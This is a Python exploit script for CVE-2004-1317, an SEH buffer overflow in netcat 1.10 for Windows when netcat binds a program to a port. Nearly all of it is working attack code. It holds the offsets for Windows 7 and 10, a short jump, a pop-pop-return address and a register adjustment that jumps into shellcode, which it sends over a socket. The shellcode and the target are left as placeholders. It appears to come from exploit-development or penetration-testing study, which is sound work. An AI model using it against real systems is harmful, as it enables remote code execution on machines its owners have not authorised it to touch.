#!/usr/bin/python3

import sys,socket

## CVE-2004-1317
## SEH Overflow for netcat.exe 1.10 NT (default kali windows-resources binary version)
## on target: .\nc.exe -n -v -L -p <port> -e ftp
## the vulnerability stems from when netcat is used to bind (-e) an executable to a port in doexec.c.

host = "<target-ip>"
port = <port>

## pattern generated with msf-pattern_create -l <length>
#payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"

## verifying 4 B's land at the expected offset
#payload = b"A" * 292   # Windows 10 x64
#payload += b"B" * 4

#payload = b"A" * 260   # Windows 7 x86
#payload += b"B" * 4

## msfvenom -p windows/exec CMD="calc.exe" -a x86 -f python -b '\x00\x0a\x0d'
## room for the payload is limited, sometimes between 250-300 bytes
buf = b""
buf += b"<shellcode>"

payload = b"\x90" * 4                   # optional nop padding
payload += buf                          # shellcode
payload += b"Z" * <padding>             # padding, to maintain same offset
payload += b"\xeb\x06\x90\x90"          # short jump +6
payload += b"\x20\x53\x40\x00"          # first pop address
payload += b"\x90\x90\x90\x90"          # optional nop padding
#payload += b"\x81\xc1\x84\x04\x00\x00"  # Win7 ecx is exactly 1156 bytes away from A's, !mona assemble -s add ecx, 0x484 to guarantee we make it into the A's
payload += b"\x81\xc1\xc8\x04\x00\x00"  # Win10 ecx is exactly 1224 bytes away from A's, !mona assemble -s add ecx, 0x4c8 to guarantee we make it into the A's
payload += b"\xff\xe1"                  # jump ecx

payload += b"C" * (600 - len(payload))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((host,port))
#banner = s.recv(1024)
#print(banner.decode())

exploit = "".encode() + bytearray(payload) + "\r\n".encode()

s.send(exploit)

s.close()
